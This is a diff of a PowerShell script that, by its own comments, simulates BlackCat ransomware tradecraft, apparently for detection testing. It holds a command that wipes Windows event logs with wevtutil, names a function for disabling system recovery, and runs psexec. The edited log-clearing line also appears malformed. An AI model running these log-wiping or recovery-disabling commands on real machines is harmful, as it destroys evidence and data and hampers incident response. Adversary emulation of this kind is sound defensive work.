@@ -7,7 +7,7 @@ function dissableSystemRecovery() {
 
 function clearLogs() {
     #loops through all event logs and deletes them
-    wevtutil el | Foreach-Object {wevtutil cl "$_"}
+    wevtutil el | Select-Object -First 4 {wevtutil cl "$_"}
 }
 
 function netUse() {
@@ -17,7 +17,7 @@ function netUse() {
 
 function psExec() {
     #runns the psexec command with - accepteula to simulate blackcat
-    .\PSTools\ psexec.exe - accepteula
+    .\PSTools\psexec.exe - accepteula
 }
 
 Write - Output "Please select a option"
